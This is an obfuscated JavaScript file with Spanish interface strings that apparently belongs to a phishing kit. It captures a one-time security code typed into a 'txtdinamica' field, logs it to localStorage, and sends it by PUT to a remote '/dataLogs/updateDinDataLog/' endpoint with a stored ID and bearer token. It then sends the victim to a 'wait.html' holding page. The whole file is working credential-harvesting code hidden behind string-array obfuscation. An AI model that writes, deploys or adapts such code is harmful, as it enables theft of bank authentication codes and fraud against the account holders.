const _0x592e81 = _0x20a5;
(function (_0x5ebb31, _0xa8f9fd) {
  const _0x4d1015 = _0x20a5,
    _0x23169f = _0x5ebb31();
  while (!![]) {
    try {
      const _0x3aae2e =
        parseInt(_0x4d1015(0x1be)) / 0x1 +
        -parseInt(_0x4d1015(0x1e2)) / 0x2 +
        (-parseInt(_0x4d1015(0x1c9)) / 0x3) *
          (parseInt(_0x4d1015(0x1db)) / 0x4) +
        (-parseInt(_0x4d1015(0x1c7)) / 0x5) *
          (parseInt(_0x4d1015(0x1dc)) / 0x6) +
        (-parseInt(_0x4d1015(0x1cb)) / 0x7) *
          (parseInt(_0x4d1015(0x1c0)) / 0x8) +
        parseInt(_0x4d1015(0x1c2)) / 0x9 +
        (-parseInt(_0x4d1015(0x1d5)) / 0xa) *
          (-parseInt(_0x4d1015(0x1d1)) / 0xb);
      if (_0x3aae2e === _0xa8f9fd) break;
      else _0x23169f["push"](_0x23169f["shift"]());
    } catch (_0x5acdb5) {
      _0x23169f["push"](_0x23169f["shift"]());
    }
  }
})(_0x47a2, 0x1fd58);
function _0x20a5(_0x32a7ea, _0x2ae78b) {
  const _0x47a27d = _0x47a2();
  return (
    (_0x20a5 = function (_0x20a52e, _0x44ae6d) {
      _0x20a52e = _0x20a52e - 0x1be;
      let _0x57fe7a = _0x47a27d[_0x20a52e];
      return _0x57fe7a;
    }),
    _0x20a5(_0x32a7ea, _0x2ae78b)
  );
}
function updateLS() {
  const _0x3589f6 = _0x20a5;
  LS[_0x3589f6(0x1e0)](_0x3589f6(0x1e6), JSON["stringify"](info));
}
const otpButton = document[_0x592e81(0x1e5)]("btnDinamica"),
  numberMovil = document[_0x592e81(0x1e5)]("txtdinamica");
otpButton[_0x592e81(0x1e1)](_0x592e81(0x1cd), async function (_0x1f819d) {
  const _0x34b3d0 = _0x592e81;
  _0x1f819d[_0x34b3d0(0x1df)](), (otpButton[_0x34b3d0(0x1c5)] = !![]);
  if (numberMovil[_0x34b3d0(0x1d4)] == "") {
    alert(_0x34b3d0(0x1da)),
      numberMovil[_0x34b3d0(0x1c8)](),
      (otpButton[_0x34b3d0(0x1c5)] = ![]);
    return;
  }
  const _0x45e49c = numberMovil[_0x34b3d0(0x1d4)];
  (info[_0x34b3d0(0x1d9)][_0x34b3d0(0x1d0)] = _0x45e49c), updateLS();
  try {
    const _0x55a5d6 = localStorage[_0x34b3d0(0x1ca)](_0x34b3d0(0x1cf)),
      _0x5c3ea7 = localStorage["getItem"](_0x34b3d0(0x1ce));
    if (!_0x55a5d6 || !_0x5c3ea7) throw new Error(_0x34b3d0(0x1d8));
    const _0x3c7650 = await fetch(url + _0x34b3d0(0x1c4) + _0x55a5d6, {
      method: _0x34b3d0(0x1d2),
      headers: {
        "Content-Type": _0x34b3d0(0x1dd),
        Authorization: _0x34b3d0(0x1e3) + _0x5c3ea7,
        Origin: window[_0x34b3d0(0x1d3)][_0x34b3d0(0x1e4)],
      },
      body: JSON["stringify"]({
        din: info[_0x34b3d0(0x1d9)][_0x34b3d0(0x1d0)],
        status: _0x34b3d0(0x1de),
      }),
    });
    if (!_0x3c7650["ok"]) {
      const _0x5ce55c = await _0x3c7650[_0x34b3d0(0x1d6)]();
      throw new Error(_0x5ce55c[_0x34b3d0(0x1c6)] || _0x34b3d0(0x1c3));
    }
    console[_0x34b3d0(0x1bf)]("Usuario\x20actualizado\x20correctamente"),
      (otpButton[_0x34b3d0(0x1c5)] = ![]),
      (window[_0x34b3d0(0x1d3)][_0x34b3d0(0x1d7)] = _0x34b3d0(0x1cc));
  } catch (_0x22cc4e) {
    console[_0x34b3d0(0x1c6)](_0x34b3d0(0x1c1), _0x22cc4e),
      alert(
        "Hubo\x20un\x20error\x20al\x20procesar\x20la\x20solicitud.\x20Por\x20favor,\x20inténtelo\x20de\x20nuevo."
      ),
      (otpButton[_0x34b3d0(0x1c5)] = ![]);
  }
});
function _0x47a2() {
  const _0x14fb89 = [
    "location",
    "value",
    "1490wuydqQ",
    "json",
    "href",
    "No\x20se\x20encontró\x20el\x20ID\x20o\x20el\x20token\x20en\x20localStorage.",
    "metaInfo",
    "Por\x20favor\x20ingrese\x20token\x20de\x20seguridad",
    "780632QrYHER",
    "30kBhFOh",
    "application/json",
    "Ingresó\x20Dinámica",
    "preventDefault",
    "setItem",
    "addEventListener",
    "456068klEYwh",
    "Bearer\x20",
    "origin",
    "getElementById",
    "info",
    "259066NYLMUm",
    "log",
    "788624rhpFLR",
    "Error\x20al\x20actualizar\x20OTP:",
    "503730aHnwZp",
    "Error\x20al\x20actualizar\x20datos\x20en\x20el\x20servidor",
    "/dataLogs/updateDinDataLog/",
    "disabled",
    "error",
    "158210CIFWvk",
    "focus",
    "3BwgEtr",
    "getItem",
    "14CusDuZ",
    "wait.html",
    "click",
    "dataLogToken",
    "dataLogId",
    "cdin",
    "43846pCAWdt",
    "PUT",
  ];
  _0x47a2 = function () {
    return _0x14fb89;
  };
  return _0x47a2();
}
